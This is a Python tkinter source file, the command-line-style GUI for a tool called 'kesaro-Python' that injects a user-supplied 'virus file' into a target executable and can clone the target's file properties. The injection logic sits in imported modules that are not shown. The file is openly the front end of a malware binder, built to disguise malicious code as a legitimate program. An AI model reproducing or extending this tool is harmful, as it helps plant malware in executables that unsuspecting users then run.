import tkinter as tk
from tkinter import messagebox
from resources.injector import *
from resources.file_manager import *
from resources.properties_manager import *
import sys


def show_help():
    messagebox.showinfo("Help", "Welcome to the kesaro-Python tool!\n"
                                "=================================\n"
                                "Available commands:\n"
                                "help: Show this help message\n"
                                "quit: Quits the program\n"
                                "explain: Explains how to inject files\n")


def execute_command(command_entry):
    command = command_entry.get().strip()

    if command == 'help':
        show_help()
    elif command == 'quit':
        sys.exit("Exiting the program...")
    elif command == 'explain':
        messagebox.showinfo("Injection Instructions", "To inject the payload, use the command:\n"
                                                     "inject [THE PATH FROM YOUR VIRUS FILE HERE] > "
                                                     "[THE PATH FROM THE FILE TO INJECT HERE]")
    elif command.startswith('inject'):
        command_parts = command.split(' ')
        if len(command_parts) != 4:
            messagebox.showinfo("Command Format", "Incorrect command format for 'inject' command.\n"
                                                  "Please use the format: inject [injected_file_path] > "
                                                  "[target_file_path]")
        else:
            injected_file = command_parts[1] if command_parts[1] != '?' else get_manual_path('Injected file', '.exe')
            target_file = command_parts[3] if command_parts[3] != '?' else get_manual_path('Target file', '.exe')
            if os.path.isfile(injected_file) and os.path.isfile(target_file):
                properties = messagebox.askyesno("Properties Cloning",
                                                 "Do you want to clone all original file's properties?")
                try:
                    inject(injected_file, target_file, properties)
                    messagebox.showinfo("Injection Successful", "File injected successfully!")
                except Exception as error:
                    messagebox.showerror("Injection Error", str(error))
            else:
                messagebox.showerror("File Error", "One of the provided files does not exist.")

    elif command == 'clear':
        # Clear the command entry
        command_entry.delete(0, tk.END)

    else:
        messagebox.showerror("Unknown Command", "Unknown command. Please try again.")


def start_help_center():
    root = tk.Tk()
    root.title("kesaro-Python Tool")
    root.geometry("400x300")

    command_label = tk.Label(root, text="Enter a command:")
    command_label.pack()

    command_entry = tk.Entry(root, width=50)
    command_entry.pack()

    execute_button = tk.Button(root, text="Execute", command=lambda: execute_command(command_entry))
    execute_button.pack()

    root.mainloop()


start_help_center()
